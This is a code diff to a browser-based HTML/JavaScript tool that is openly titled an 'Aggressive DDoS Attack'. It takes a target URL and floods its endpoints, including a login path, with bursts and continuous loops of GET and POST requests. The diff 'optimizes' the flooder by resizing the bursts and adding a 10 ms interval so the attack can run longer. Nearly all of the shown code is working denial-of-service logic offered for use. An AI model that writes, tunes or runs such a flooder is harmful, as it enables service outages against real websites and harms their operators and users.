@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aggressive DDoS Attack</title>
+    <title>Optimized Aggressive DDoS Attack</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -52,7 +52,7 @@
     </style>
 </head>
 <body>
-    <h1>Aggressive DDoS Attack</h1>
+    <h1>Optimized Aggressive DDoS Attack</h1>
     <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
     <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
     <div id="status"></div>
@@ -103,19 +103,19 @@
                 `${targetURL}/login`
             ];
 
-            // Initial burst of 5000 requests for each method and endpoint
-            for (let i = 0; i < 5000; i++) {
-                ['HEAD', 'GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'].forEach(method => {
+            // Reduced initial burst to 1000 requests for each method and endpoint
+            for (let i = 0; i < 1000; i++) {
+                ['GET', 'POST'].forEach(method => {
                     endpoints.forEach(endpoint => sendRequest(method, endpoint));
                 });
             }
 
-            // Aggressive looping for each method and endpoint
+            // Aggressive looping with a slight delay to optimize performance
             attackInterval = setInterval(() => {
-                ['HEAD', 'GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'].forEach(method => {
+                ['GET', 'POST'].forEach(method => {
                     endpoints.forEach(endpoint => sendRequest(method, endpoint));
                 });
-            }, 0);  // Reduced interval to 0 for maximum frequency
+            }, 10);  // Slight delay to optimize performance
         }
 
         function stopAttack() {
